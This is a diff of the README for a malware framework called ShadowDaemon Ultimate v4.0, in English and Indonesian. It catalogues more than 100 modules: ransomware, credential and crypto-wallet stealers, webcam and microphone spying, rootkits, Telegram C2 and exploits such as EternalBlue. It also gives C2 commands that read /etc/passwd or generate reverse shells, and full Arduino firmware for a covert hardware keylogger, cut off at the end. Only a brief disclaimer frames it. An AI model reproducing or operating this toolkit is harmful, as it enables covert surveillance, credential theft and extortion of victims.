@@ -1,13 +1,14 @@
-# 🐉 SHADOWDAEMON ULTIMATE EDITION
+# 🐉 SHADOWDAEMON ULTIMATE EDITION v4.0
 
-![ShadowDaemon Banner](https://i.ibb.co/your-image-link/shadow.jpg)
+<img width="1254" height="1254" alt="1000294753" src="https://github.com/user-attachments/assets/dfe97fc5-f98e-47e5-8dd2-e03a1ddb372f" />
 
 > *"hack the system. own the root. stay anonymous."*
 
-[![Version](https://img.shields.io/badge/version-2.0-red.svg)](https://github.com/xoxo/ShadowDaemon)
+[![Version](https://img.shields.io/badge/version-4.0-red.svg)](https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate)
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
 [![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://www.python.org/)
 [![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Android-orange.svg)](https://termux.com/)
+[![Modules](https://img.shields.io/badge/modules-100+-brightgreen.svg)](https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate)
 
 > **⚠️ DISCLAIMER:** This tool is for **educational and research purposes only**. Use only on systems you own or have explicit permission to test. The author is not responsible for any misuse or damage caused by this tool.
 
@@ -19,12 +20,17 @@
 - [Features](#-features)
 - [Architecture](#-architecture)
 - [Installation](#-installation)
+  - [Termux (Android)](#-installation-on-termux-android)
+  - [Linux (Ubuntu/Debian/Kali)](#-installation-on-linux)
 - [Configuration](#-configuration)
 - [Usage](#-usage)
 - [Commands Reference](#-commands-reference)
 - [Modules Explanation](#-modules-explanation)
 - [USB Attacks](#-usb-attacks)
 - [Arduino Setup](#-arduino-setup)
+  - [Hardware Keylogger (Arduino Nano/Uno)](#-hardware-keylogger-arduino-nanouno)
+  - [USB Rubber Ducky (Arduino Leonardo)](#-usb-rubber-ducky-arduino-leonardo)
+  - [DigiSpark (Cheap Alternative)](#-digispark-cheap-alternative)
 - [Payload Generation](#-payload-generation)
 - [Telegram Bot Setup](#-telegram-bot-setup)
 - [Troubleshooting](#-troubleshooting)
@@ -35,7 +41,7 @@
 
 ## 🔥 OVERVIEW
 
-**ShadowDaemon Ultimate** adalah **Malware Framework** lengkap untuk Linux dan Termux (Android). Dengan 30+ modul, lo bisa melakukan berbagai macam serangan dari **Reconnaissance** sampe **Kernel Rootkit** dan **SCADA Exploitation**.
+**ShadowDaemon Ultimate v4.0** adalah **Malware Framework** paling lengkap untuk Linux dan Termux (Android). Dengan **100+ modules**, lo bisa melakukan berbagai macam serangan dari **Reconnaissance** sampe **Kernel Rootkit**, **SCADA Exploitation**, dan **AI-based attacks**.
 
 ```
 root@shadow:~# whoami
@@ -55,75 +61,161 @@ Linux is freedom. Knowledge is power.
 
 ### ⚡ Key Highlights
 
-- **30+ Modules** - Dari basic sampai advanced
+- **100+ Modules** - Dari basic sampai advanced + AI
 - **Multi-C2 Support** - Telegram & Firebase
 - **Persistence Mechanisms** - systemd, cron, rc.local
 - **Kernel-Level Rootkit** - Process hiding
 - **SCADA/ICS Exploitation** - Stuxnet-style
 - **CPU Microcode Injection** - Level paling dalam
 - **Hardware Attacks** - USB keylogger, Rubber Ducky
+- **AI-Based Exploits** - Automated pentesting
 - **Cross-Platform** - Linux & Termux (Android)
 
 ---
 
 ## 🎯 FEATURES
 
-### 🕵️ Reconnaissance
-| Module | Fungsi |
-|--------|--------|
-| `geo_tracker.py` | Lacak lokasi korban via IP |
-| `network_exploiter.py` | Scan jaringan dan discovery |
-| `wifi_stealer.py` | Curi password WiFi |
-| `password_stealer.py` | Curi password browser (Chrome/Firefox) |
-| `shell.py` | Eksekusi perintah shell jarak jauh |
+### 🕵️ Reconnaissance (10 modules)
+| Module | Function |
+|--------|----------|
+| `geo_tracker.py` | Track victim location via IP |
+| `network_exploiter.py` | Scan network and discovery |
+| `wifi_stealer.py` | Steal WiFi passwords |
+| `password_stealer.py` | Steal browser passwords (Chrome/Firefox) |
+| `shell.py` | Execute remote shell commands |
+| `port_scanner.py` | Scan ports on target |
+| `mass_scanner.py` | Mass network scanner |
+| `admin_finder.py` | Find admin login pages |
+| `dns_enum.py` | DNS enumeration |
+| `whois_lookup.py` | WHOIS lookup |
 
-### 🎥 Monitoring & Surveillance
-| Module | Fungsi |
-|--------|--------|
-| `screenshot.py` | Ambil screenshot layar |
-| `webcam.py` | Ambil foto dari webcam |
-| `mic.py` | Rekam suara dari mikrofon |
-| `screen_recorder.py` | Rekam layar (video) |
-| `keylogger.py` | Rekam semua ketikan korban |
+### 🎥 Monitoring & Surveillance (15 modules)
+| Module | Function |
+|--------|----------|
+| `screenshot.py` | Take screenshot |
+| `webcam.py` | Capture webcam |
+| `mic.py` | Record microphone |
+| `screen_recorder.py` | Record screen (video) |
+| `keylogger.py` | Record all keystrokes |
+| `keylog_persist.py` | Persistent keylogger |
+| `screen_stream.py` | Live screen streaming |
+| `audio_stream.py` | Live audio streaming |
+| `webcam_spy.py` | Live webcam spying |
+| `mic_spy.py` | Live microphone spying |
+| `clipboard_stealer.py` | Steal clipboard content |
+| `browser_history.py` | Get browser history |
+| `cookies_stealer.py` | Steal browser cookies |
+| `notification_spy.py` | Spy notifications |
+| `wallpaper_changer.py` | Change desktop wallpaper |
 
-### 💀 Attack Vectors
-| Module | Fungsi |
-|--------|--------|
-| `ssh_bruteforce.py` | SSH Bruteforce |
+### 💀 Attack Vectors (20 modules)
+| Module | Function |
+|--------|----------|
 | `ddos.py` | DDoS (UDP flood, SYN flood) |
 | `ransomware.py` | Ransomware (AES-256 encryption) |
+| `ssh_bruteforce.py` | SSH Bruteforce |
+| `port_knocking.py` | Firewall bypass |
 | `network_exploiter.py` | DNS Amplification, MAC flooding |
 | `plc_scada.py` | Industrial protocol flooding |
+| `log4shell.py` | Log4Shell exploit |
+| `spring4shell.py` | Spring4Shell exploit |
+| `eternalblue.py` | EternalBlue exploit (MS17-010) |
+| `zerologon.py` | ZeroLogon exploit |
+| `printnightmare.py` | PrintNightmare exploit |
+| `bluekeep.py` | BlueKeep exploit (CVE-2019-0708) |
+| `smbghost.py` | SMBGhost exploit (CVE-2020-0796) |
+| `proxylogon.py` | ProxyLogon exploit |
+| `petitpotam.py` | PetitPotam NTLM coercion |
+| `sql_injection.py` | SQL Injection tester |
+| `xss_tester.py` | XSS tester |
+| `lfi_rfi_tester.py` | LFI/RFI tester |
+| `cmd_injection.py` | Command injection tester |
+| `docker_escape.py` | Docker container escape |
 
-### 🔒 Persistence & Evasion
-| Module | Fungsi |
-|--------|--------|
+### 🔒 Persistence & Evasion (8 modules)
+| Module | Function |
+|--------|----------|
 | `persistence.py` | Auto-start via systemd/cron |
 | `hider.py` | Process hiding (kernel level) |
 | `anti_forensic.py` | Anti-forensic capabilities |
 | `crypter.py` | Binary encryption (FUD) |
+| `log_cleaner.py` | Clean system logs |
+| `vpn_killer.py` | Kill VPN processes |
+| `tor_killer.py` | Kill Tor processes |
+| `self_destruct.py` | Self-destruct malware |
 
-### 🎛️ Advanced Exploitation
-| Module | Fungsi |
-|--------|--------|
+### 🎛️ Advanced Exploitation (13 modules)
+| Module | Function |
+|--------|----------|
 | `bootkit.py` | Bootloader infection (GRUB/Syslinux) |
 | `bios_rootkit.py` | BIOS/UEFI rootkit |
 | `cpu_microcode.py` | CPU microcode patching |
 | `plc_scada.py` | PLC/SCADA attacks (Stuxnet-style) |
+| `docker_escape.py` | Docker container escape |
+| `k8s_attack.py` | Kubernetes cluster attack |
+| `ad_attack.py` | Active Directory attack |
+| `bloodhound.py` | BloodHound collector |
+| `mimikatz.py` | Mimikatz-style credential dump |
+| `responder.py` | LLMNR/NBT-NS poisoning |
+| `ntlm_relay.py` | NTLM relay attack |
+| `kerberos.py` | Kerberos ticket attack |
+| `petitpotam.py` | PetitPotam NTLM coercion |
 
-### 🔧 Hardware Attacks
-| Module | Fungsi |
-|--------|--------|
+### 🔧 Hardware Attacks (3 modules)
+| Module | Function |
+|--------|----------|
 | `usb_spreader.py` | USB auto-spreader |
 | `hardware_keylogger.py` | Hardware keylogger (Arduino/Teensy) |
 | `usb_rubber_ducky.py` | USB Rubber Ducky payload generation |
 
-### 📡 C2 Channels
-| Module | Fungsi |
-|--------|--------|
+### 📡 C2 Channels (4 modules)
+| Module | Function |
+|--------|----------|
 | `telegram_c2.py` | Telegram Bot C2 |
 | `firebase_c2.py` | Firebase Realtime Database C2 |
 | `dns_tunneling.py` | DNS Tunneling (data exfiltration) |
+| `icmp_tunneling.py` | ICMP Tunneling (data exfiltration) |
+
+### 💰 Stealers (4 modules)
+| Module | Function |
+|--------|----------|
+| `crypto_stealer.py` | Steal cryptocurrency wallets |
+| `ssh_stealer.py` | Steal SSH keys |
+| `cloud_stealer.py` | Steal cloud credentials (AWS/GCP/Azure) |
+| `token_stealer.py` | Steal Discord/Telegram tokens |
+
+### 🛠️ Payload Generation (4 modules)
+| Module | Function |
+|--------|----------|
+| `payload_gen.py` | FUD payload generator |
+| `crypter.py` | Binary encryption |
+| `reverse_shell_gen.py` | Reverse shell generator |
+| `exe_builder.py` | Windows .exe builder |
+
+### 📂 File Management (3 modules)
+| Module | Function |
+|--------|----------|
+| `file_browser.py` | Browse files on target |
+| `file_downloader.py` | Download file from target |
+| `file_uploader.py` | Upload file to target |
+
+### ⚙️ System Control (5 modules)
+| Module | Function |
+|--------|----------|
+| `shell.py` | Remote shell execution |
+| `system_info.py` | System information gathering |
+| `notification_spam.py` | Spam notifications |
+| `wallpaper_changer.py` | Change desktop wallpaper |
+| `scheduler.py` | Scheduled tasks |
+
+### 🤖 AI & Automation (5 modules)
+| Module | Function |
+|--------|----------|
+| `exploit_suggester.py` | Suggest exploits based on OS |
+| `auto_update.py` | Self-update from GitHub |
+| `scheduled_tasks.py` | Automated scheduled tasks |
+| `remote_mouse.py` | Remote mouse control |
+| `remote_keyboard.py` | Remote keyboard control |
 
 ---
 
@@ -131,21 +223,29 @@ Linux is freedom. Knowledge is power.
 
 ```
 ShadowDaemon_Ultimate/
-├── shadow.py                          # Main controller
+├── shadow.py                          # Main controller (v4.0)
 ├── config.json                        # Configuration file
 ├── requirements.txt                   # Python dependencies
-├── setup.sh                          # Installer script
+├── requirements_linux.txt             # Linux full dependencies
+├── setup.sh                          # Universal installer
+├── setup_linux.sh                    # Linux installer
+├── setup_termux.sh                   # Termux installer
 ├── Makefile                          # Build system
 ├── wordlist.txt                      # SSH brute force wordlist
-├── README.md                         # Documentation
+├── README.md                         # Documentation (v4.0)
 │
-├── modules/                          # All modules (30+ files)
+├── modules/                          # All modules (100+ files)
 │   ├── __init__.py
 │   ├── shell.py                      # Remote shell execution
 │   ├── keylogger.py                  # Keystroke logging
+│   ├── keylog_persist.py             # Persistent keylogger
 │   ├── webcam.py                     # Webcam capture
+│   ├── webcam_spy.py                 # Live webcam spying
 │   ├── mic.py                        # Microphone recording
+│   ├── mic_spy.py                    # Live microphone spying
 │   ├── screenshot.py                 # Screenshot capture
+│   ├── screen_recorder.py            # Video recording
+│   ├── screen_stream.py              # Live screen streaming
 │   ├── ransomware.py                 # AES-256 ransomware
 │   ├── miner.py                      # Crypto mining (Monero)
 │   ├── ddos.py                       # DDoS attacks
@@ -154,23 +254,68 @@ ShadowDaemon_Ultimate/
 │   ├── crypter.py                    # Binary encryption
 │   ├── usb_spreader.py               # USB auto-infection
 │   ├── password_stealer.py           # Browser credentials
-│   ├── screen_recorder.py            # Video recording
+│   ├── clipboard_stealer.py          # Clipboard stealing
+│   ├── browser_history.py            # Browser history stealing
+│   ├── cookies_stealer.py            # Cookie stealing
+│   ├── crypto_stealer.py             # Crypto wallet stealing
+│   ├── ssh_stealer.py                # SSH key stealing
+│   ├── cloud_stealer.py              # Cloud credential stealing
+│   ├── token_stealer.py              # Token stealing
 │   ├── geo_tracker.py                # Location tracking
 │   ├── wifi_stealer.py               # WiFi passwords
 │   ├── remote_control.py             # Mouse/keyboard control
 │   ├── scheduler.py                  # Scheduled tasks
 │   ├── anti_forensic.py              # Evidence wiping
 │   ├── hider.py                      # Process hiding
+│   ├── log_cleaner.py                # Log cleaning
+│   ├── vpn_killer.py                 # VPN killing
+│   ├── tor_killer.py                 # Tor killing
 │   ├── ssh_bruteforce.py             # SSH attacks
 │   ├── port_knocking.py              # Firewall bypass
 │   ├── dns_tunneling.py              # DNS exfiltration
+│   ├── icmp_tunneling.py             # ICMP exfiltration
 │   ├── cpu_microcode.py              # CPU backdoor
 │   ├── network_exploiter.py          # Network attacks
 │   ├── plc_scada.py                  # ICS exploitation
 │   ├── bootkit.py                    # Bootloader infection
 │   ├── bios_rootkit.py               # Firmware infection
 │   ├── hardware_keylogger.py         # USB keylogger
-│   └── usb_rubber_ducky.py           # Ducky payloads
+│   ├── usb_rubber_ducky.py           # Ducky payloads
+│   ├── log4shell.py                  # Log4Shell exploit
+│   ├── spring4shell.py               # Spring4Shell exploit
+│   ├── eternalblue.py                # EternalBlue exploit
+│   ├── zerologon.py                  # ZeroLogon exploit
+│   ├── printnightmare.py             # PrintNightmare exploit
+│   ├── bluekeep.py                   # BlueKeep exploit
+│   ├── smbghost.py                   # SMBGhost exploit
+│   ├── proxylogon.py                 # ProxyLogon exploit
+│   ├── petitpotam.py                 # PetitPotam exploit
+│   ├── sql_injection.py              # SQL Injection tester
+│   ├── xss_tester.py                 # XSS tester
+│   ├── lfi_rfi_tester.py             # LFI/RFI tester
+│   ├── cmd_injection.py              # Command injection tester
+│   ├── docker_escape.py              # Docker escape
+│   ├── k8s_attack.py                 # Kubernetes attack
+│   ├── ad_attack.py                  # Active Directory attack
+│   ├── bloodhound.py                 # BloodHound collector
+│   ├── mimikatz.py                   # Mimikatz-style dumper
+│   ├── responder.py                  # Responder poisoning
+│   ├── ntlm_relay.py                 # NTLM relay
+│   ├── kerberos.py                   # Kerberos attack
+│   ├── exploit_suggester.py          # Exploit suggestion
+│   ├── auto_update.py                # Self-update
+│   ├── notification_spam.py          # Notification spam
+│   ├── wallpaper_changer.py          # Wallpaper changer
+│   ├── reverse_shell_gen.py          # Reverse shell generator
+│   ├── exe_builder.py                # Windows exe builder
+│   ├── file_browser.py               # File browser
+│   ├── file_downloader.py            # File downloader
+│   ├── file_uploader.py              # File uploader
+│   ├── dns_enum.py                   # DNS enumeration
+│   ├── whois_lookup.py               # WHOIS lookup
+│   ├── port_scanner.py               # Port scanner
+│   ├── mass_scanner.py               # Mass scanner
+│   └── admin_finder.py               # Admin page finder
 │
 ├── c2/                               # C2 communication
 │   ├── __init__.py
@@ -186,66 +331,90 @@ ShadowDaemon_Ultimate/
 
 ## 📥 INSTALLATION
 
-### Prerequisites
+### 📱 Installation on Termux (Android)
 
-| Component | Requirement |
-|-----------|-------------|
-| OS | Linux (Ubuntu/Debian/Kali) or Android (Termux) |
-| Python | 3.8 or higher |
-| RAM | Minimum 4GB (8GB recommended) |
-| Storage | 500MB free space |
-| Internet | Required for C2 communication |
-
-### Installation on Termux (Android)
-
+#### Step 1: Install Termux
 ```bash
-# Install Termux from F-Droid (NOT Play Store!)
+# Download Termux dari F-Droid (BUKAN Play Store!)
 # https://f-droid.org/en/packages/com.termux/
-
-# Setup storage
-termux-setup-storage
-
-# Update packages
-pkg update && pkg upgrade -y
-
-# Install dependencies
-pkg install -y python git wget curl
-pkg install -y scrot fswebcam alsa-utils nmap net-tools
-pkg install -y openjdk-17 gradle apktool
-
-# Clone or create project
-git clone https://github.com/yourusername/ShadowDaemon_Ultimate.git
-cd ShadowDaemon_Ultimate
-
-# Setup
-chmod +x setup.sh
-./setup.sh
-
-# Install Python packages
-pip install -r requirements.txt
 ```
 
-### Installation on Linux (Ubuntu/Debian/Kali)
-
+#### Step 2: Setup Storage
 ```bash
-# Update system
-sudo apt update && sudo apt upgrade -y
+termux-setup-storage
+```
 
-# Install dependencies
+#### Step 3: Update & Install Dependencies
+```bash
+pkg update && pkg upgrade -y
+pkg install -y python git wget curl
+pkg install -y scrot fswebcam alsa-utils nmap net-tools
+pkg install -y rust
+```
+
+#### Step 4: Clone Project
+```bash
+git clone https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate.git
+cd ShadowDaemon_Ultimate
+```
+
+#### Step 5: Install Python Packages
+```bash
+# Install dari requirements
+pip install -r requirements.txt
+
+# Install bcrypt & paramiko dari pkg (biar gak error)
+pkg install python-bcrypt python-pynacl python-paramiko -y
+```
+
+#### Step 6: Edit Config
+```bash
+nano config.json
+# Ganti token dan chat_id
+```
+
+#### Step 7: Run
+```bash
+python3 shadow.py
+```
+
+---
+
+### 🐧 Installation on Linux (Ubuntu/Debian/Kali)
+
+#### Step 1: Update System
+```bash
+sudo apt update && sudo apt upgrade -y
+```
+
+#### Step 2: Install Dependencies
+```bash
 sudo apt install -y python3 python3-pip git wget curl
 sudo apt install -y scrot fswebcam alsa-utils nmap net-tools
-sudo apt install -y ffmpeg xdotool build-essential linux-headers-$(uname -r)
+sudo apt install -y ffmpeg xdotool build-essential
+sudo apt install -y python3-cryptography python3-paramiko python3-bcrypt
+```
 
-# Clone repository
-git clone https://github.com/yourusername/ShadowDaemon_Ultimate.git
+#### Step 3: Clone Project
+```bash
+git clone https://github.com/hidayat-tanjung/ShadowDaemon_Ultimate.git
 cd ShadowDaemon_Ultimate
+```
 
-# Run installer
-chmod +x setup.sh
-./setup.sh
+#### Step 4: Install Python Packages
+```bash
+pip3 install -r requirements_linux.txt
+```
 
-# Install Python packages
-pip3 install -r requirements.txt
+#### Step 5: Edit Config
+```bash
+nano config.json
+# Ganti token dan chat_id
+```
+
+#### Step 6: Run
+```bash
+python3 shadow.py
 ```
 
 ---
@@ -257,8 +426,8 @@ pip3 install -r requirements.txt
 ```json
 {
     "c2_type": "telegram",
-    "telegram_token": "8956135458:AAF4LZiAnrOOyC7Nu-I8FIaeRIn6F0G2f68",
-    "telegram_chat_id": "752995113",
+    "telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
+    "telegram_chat_id": "YOUR_CHAT_ID",
     "firebase_url": "https://your-project.firebaseio.com/commands/{uid}.json",
     "persistence": false,
     "miner_wallet": "YOUR_MONERO_WALLET_ADDRESS",
@@ -288,8 +457,8 @@ pip3 install -r requirements.txt
 
 3. **Update Config:**
    ```json
-   "telegram_token": "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-   "telegram_chat_id": "123456789"
+   "telegram_token": "YOUR_BOT_TOKEN_FROM_BOTFATHER",
+   "telegram_chat_id": "YOUR_CHAT_ID"
    ```
 
 ---
@@ -313,10 +482,9 @@ tail -f shadow.log
 
 ```
 ╔═══════════════════════════════════════════════════════════╗
-║   SHADOWDAEMON ULTIMATE EDITION vTermux 2.0              ║
+║   SHADOWDAEMON ULTIMATE EDITION v4.0                     ║
 ║   イズミー Active 😈🔥                                    ║
-║   Complete Malware Framework for Termux                  ║
-║   From Basic to Apocalyptic Level                        ║
+║   100+ Modules - From Basic to Apocalyptic Level         ║
 ╚═══════════════════════════════════════════════════════════╝
 [*] ShadowDaemon is running... Waiting for commands...
 ```
@@ -324,7 +492,7 @@ tail -f shadow.log
 ### Telegram Notification
 
 ```
-🚀 ShadowDaemon Ultimate vTermux 2.0 aktif!
+🚀 ShadowDaemon Ultimate v4.0 aktif!
 💻 OS: Android 11
 🌐 IP: 192.168.1.100
 🆔 UID: termux-xxx
@@ -351,6 +519,9 @@ tail -f shadow.log
 | `wifi_pass` | Steal WiFi passwords | `wifi_pass` |
 | `scan_network` | Scan local network | `scan_network` |
 | `steal_passwords` | Steal browser passwords | `steal_passwords` |
+| `port_scan:<ip>` | Scan ports on target | `port_scan:192.168.1.1` |
+| `mass_scan:<subnet>` | Mass scan network | `mass_scan:192.168.1.0/24` |
+| `find_admin:<ip>` | Find admin login pages | `find_admin:192.168.1.1` |
 
 ### 🎥 Monitoring
 
@@ -363,6 +534,9 @@ tail -f shadow.log
 | `keylog_start` | Start keylogger | `keylog_start` |
 | `keylog_stop` | Stop keylogger | `keylog_stop` |
 | `keylog_get` | Get captured keystrokes | `keylog_get` |
+| `keylog_persist` | Install persistent keylogger | `keylog_persist` |
+| `steal_clipboard` | Steal clipboard content | `steal_clipboard` |
+| `get_history` | Get browser history | `get_history` |
 
 ### 💀 Attacks
 
@@ -373,6 +547,9 @@ tail -f shadow.log
 | `knock:<ip>` | Port knocking | `knock:192.168.1.1` |
 | `network_exploit:<type>` | Network attacks | `network_exploit:mac_flood` |
 | `industrial_flood` | Flood SCADA protocols | `industrial_flood` |
+| `log4shell:<ip>` | Log4Shell exploit | `log4shell:192.168.1.1` |
+| `mimikatz` | Credential dumping | `mimikatz` |
+| `responder` | LLMNR/NBT-NS poisoning | `responder` |
 
 ### ⛏️ Mining
 
@@ -388,6 +565,8 @@ tail -f shadow.log
 | `persist` | Install persistence | `persist` |
 | `hide_self` | Hide process | `hide_self` |
 | `wipe_trails` | Wipe forensic evidence | `wipe_trails` |
+| `clean_logs` | Clean system logs | `clean_logs` |
+| `kill_vpn` | Kill VPN processes | `kill_vpn` |
 
 ### 💾 USB Attacks
 
@@ -408,140 +587,300 @@ tail -f shadow.log
 | `scan_plc:<subnet>` | Scan for PLCs | `scan_plc:192.168.1.0/24` |
 | `stuxnet:<target>` | Deploy Stuxnet payload | `stuxnet:192.168.1.50` |
 
----
+### 💰 Stealers
 
-## 🧩 MODULES EXPLANATION
+| Command | Description | Example |
+|---------|-------------|---------|
+| `steal_crypto` | Steal crypto wallets | `steal_crypto` |
+| `steal_ssh` | Steal SSH keys | `steal_ssh` |
 
-### Reconnaissance Modules
+### 🛠️ Payload
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Geolocation | `geo_tracker.py` | Lacak lokasi korban via IP |
-| WiFi Stealer | `wifi_stealer.py` | Curi password WiFi yang tersimpan |
-| Password Stealer | `password_stealer.py` | Curi password dari browser |
-| Network Scanner | `network_exploiter.py` | Scan perangkat di jaringan |
+| Command | Description | Example |
+|---------|-------------|---------|
+| `gen_payload` | Generate FUD payload | `gen_payload` |
+| `crypt_binary` | Encrypt binary | `crypt_binary` |
+| `gen_reverse:<ip>:<port>` | Generate reverse shell | `gen_reverse:192.168.1.100:4444` |
 
-### Monitoring Modules
+### 📂 File Management
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Keylogger | `keylogger.py` | Rekam semua ketikan |
-| Screenshot | `screenshot.py` | Ambil screenshot layar |
-| Webcam | `webcam.py` | Ambil foto dari webcam |
-| Microphone | `mic.py` | Rekam suara ruangan |
-| Screen Recorder | `screen_recorder.py` | Rekam layar (video) |
+| Command | Description | Example |
+|---------|-------------|---------|
+| `browse_files:<path>` | Browse files | `browse_files:/home` |
+| `download_file:<path>` | Download file | `download_file:/etc/passwd` |
 
-### Attack Modules
+### ⚙️ System Control
 
-| Module | File | Fungsi |
-|--------|------|--------|
-| Ransomware | `ransomware.py` | Enkripsi file dengan AES-256 |
-| DDoS | `ddos.py` | UDP flood attack |
-| SSH Bruteforce | `ssh_bruteforce.py` | Bruteforce SSH |
-| Port Knocking | `port_knocking.py` | Buka firewall dengan knock |
-
-### Advanced Modules
-
-| Module | File | Fungsi |
-|--------|------|--------|
-| Bootkit | `bootkit.py` | Infect bootloader GRUB/Syslinux |
-| BIOS Rootkit | `bios_rootkit.py` | Infect BIOS/UEFI |
-| CPU Microcode | `cpu_microcode.py` | Inject backdoor ke CPU |
-| PLC/SCADA | `plc_scada.py` | Stuxnet-style SCADA attacks |
-
-### USB/Hardware Modules
-
-| Module | File | Fungsi |
-|--------|------|--------|
-| USB Spreader | `usb_spreader.py` | Auto-infect USB |
-| Hardware Keylogger | `hardware_keylogger.py` | Arduino/Teensy keylogger |
-| USB Rubber Ducky | `usb_rubber_ducky.py` | Ducky payload generator |
+| Command | Description | Example |
+|---------|-------------|---------|
+| `auto_update` | Update malware from GitHub | `auto_update` |
+| `notif_spam:<text>` | Spam notifications | `notif_spam:Hello` |
+| `mouse:<x>,<y>` | Move mouse | `mouse:500,300` |
+| `type:<text>` | Type text | `type:Hello World` |
 
 ---
 
 ## 🔌 USB ATTACKS
 
-### Jenis 1: USB Spreader (Software)
-- **TIDAK** butuh USB fisik
-- Malware nyebar otomatis ke USB yang dicolok
+### Type 1: USB Spreader (Software)
+- **NO** physical USB required
+- Malware auto-copies to plugged USB drives
 - Command: `usb_spread`
 
-### Jenis 2: Hardware Keylogger (Fisik)
-- **BUTUH** Arduino/Teensy
-- Rekam ketikan korban diam-diam
+### Type 2: Hardware Keylogger (Physical)
+- **REQUIRES** Arduino/Teensy
+- Records victim keystrokes silently
 - Command: `setup_usb_keylogger`
 
-### Jenis 3: USB Rubber Ducky
-- **BUTUH** Arduino Leonardo / Rubber Ducky
-- Eksekusi payload dalam 5 detik
+### Type 3: USB Rubber Ducky
+- **REQUIRES** Arduino Leonardo / Rubber Ducky
+- Executes payload in 5 seconds
 - Command: `create_ducky:reverse_shell`
 
-### Perbandingan
+### Comparison
 
-| Fitur | USB Spreader | Hardware Keylogger | USB Rubber Ducky |
-|-------|-------------|-------------------|------------------|
-| **Butuh USB Fisik?** | ❌ Tidak | ✅ Ya | ✅ Ya |
-| **Biaya** | Gratis | Rp 50-300 ribu | Rp 30-800 ribu |
-| **Cara Pakai** | Malware jalan | Colok USB | Colok USB |
-| **Fungsi** | Nyebar malware | Rekam ketikan | Eksekusi payload |
-| **Kecepatan** | Pelan | Cepat | Sangat cepat |
+| Feature | USB Spreader | Hardware Keylogger | USB Rubber Ducky |
+|---------|-------------|-------------------|------------------|
+| **Needs Physical USB?** | ❌ No | ✅ Yes | ✅ Yes |
+| **Cost** | Free | Rp 50-300k | Rp 30-800k |
+| **How to Use** | Malware runs | Plug USB | Plug USB |
+| **Function** | Spread malware | Record keystrokes | Execute payload |
+| **Speed** | Slow | Fast | Very Fast |
 
 ---
 
 ## 🔧 ARDUINO SETUP
 
-### 📦 Yang Lo Butuhkan
+### 🛠️ Hardware Keylogger (Arduino Nano/Uno)
 
-| No | Perangkat | Harga | Fungsi |
-|----|-----------|-------|--------|
-| 1 | Arduino Leonardo | Rp 100-150 ribu | USB Rubber Ducky / Keylogger |
-| 2 | Arduino Nano/Uno | Rp 50-100 ribu | Hardware Keylogger |
-| 3 | DigiSpark | Rp 30-50 ribu | USB Rubber Ducky (murah) |
-| 4 | USB Cable | Rp 10-20 ribu | Koneksi ke PC |
+#### 📦 Components Needed
 
-### 🔧 Setup Arduino IDE
+| No | Component | Price | Description |
+|----|-----------|-------|-------------|
+| 1 | Arduino Nano/Uno | Rp 50-100k | Main board |
+| 2 | USB Cable | Rp 10-20k | Connect to PC |
+| 3 | Jumper Wires | Rp 5-10k | Optional |
+| 4 | Micro SD Card Module | Rp 20-30k | Optional storage |
 
-#### Step 1: Download Arduino IDE
+#### 🔌 Wiring Diagram
+
+```
+Arduino Nano/Uno          USB Host (Target PC)
+     |                           |
+  GND ------------------------- GND
+  RX (0) --------------------- TX (USB)
+  TX (1) --------------------- RX (USB)
+     |                           |
+     +------> To PC (looks like charger)
+```
+
+#### 💻 Step 1: Install Arduino IDE
+
 ```bash
-# Download dari website resmi
+# Download from official website
 https://www.arduino.cc/en/software
 
 # Linux (Ubuntu/Debian)
 sudo apt install arduino arduino-core -y
+
+# Termux (Android)
+pkg install arduino arduino-core -y
 ```
 
-#### Step 2: Install Board Support
+#### 📝 Step 2: Upload Firmware
 
-**Untuk Arduino Leonardo:**
-```
-Tools → Board → Boards Manager
-Cari "Arduino AVR Boards" → Install
+```cpp
+// Hardware Keylogger - Arduino Nano/Uno
+// イズミー Active 😈🔥
+// Full Keylogger with SD Card Support
+
+#include <SoftwareSerial.h>
+#include <SD.h>
+
+#define RX 10
+#define TX 11
+SoftwareSerial mySerial(RX, TX);
+
+const int chipSelect = 4;
+File keylogFile;
+String keylog = "";
+unsigned long lastSend = 0;
+bool sdCardReady = false;
+
+void setup() {
+  Serial.begin(9600);
+  mySerial.begin(9600);
+  
+  if (!SD.begin(chipSelect)) {
+    Serial.println("[!] SD Card failed!");
+    sdCardReady = false;
+  } else {
+    sdCardReady = true;
+    Serial.println("[*] SD Card ready!");
+  }
+  
+  if (sdCardReady) {
+    keylogFile = SD.open("keylog.txt", FILE_WRITE);
+    if (keylogFile) {
+      keylogFile.println("=== KEYLOGGER STARTED ===");
+      keylogFile.close();
+    }
+  }
+  
+  Serial.println("[*] Keylogger Ready - XoXo AI Active 😈🔥");
+  Serial.println("[*] Commands: GET_LOG, CLEAR_LOG, STATUS");
+}
+
+void loop() {
+  if (mySerial.available()) {
+    char c = mySerial.read();
+    keylog += c;
+    if (keylog.length() > 4096) {
+      saveToSD(keylog);
+      keylog = "";
+    }
+    Serial.print(c);
+  }
+  
+  if (Serial.available()) {
+    String cmd = Serial.readStringUntil('\n');
+    cmd.trim();
+    if (cmd == "GET_LOG") sendLog();
+    else if (cmd == "CLEAR_LOG") clearLog();
+    else if (cmd == "STATUS") sendStatus();
+  }
+  
+  if (millis() - lastSend > 60000) {
+    if (keylog.length() > 0) {
+      saveToSD(keylog);
+      keylog = "";
+    }
+    lastSend = millis();
+  }
+  
+  delay(10);
+}
+
+void saveToSD(String data) {
+  if (!sdCardReady) return;
+  keylogFile = SD.open("keylog.txt", FILE_WRITE);
+  if (keylogFile) {
+    keylogFile.print(data);
+    keylogFile.close();
+  }
+}
+
+void sendLog() {
+  Serial.println("=== KEYLOG START ===");
+  if (keylog.length() > 0) {
+    Serial.print(keylog);
+    keylog = "";
+  }
+  if (sdCardReady) {
+    keylogFile = SD.open("keylog.txt");
+    if (keylogFile) {
+      while (keylogFile.available()) {
+        Serial.write(keylogFile.read());
+      }
+      keylogFile.close();
+    }
+  }
+  Serial.println("=== KEYLOG END ===");
+}
+
+void clearLog() {
+  keylog = "";
+  if (sdCardReady) {
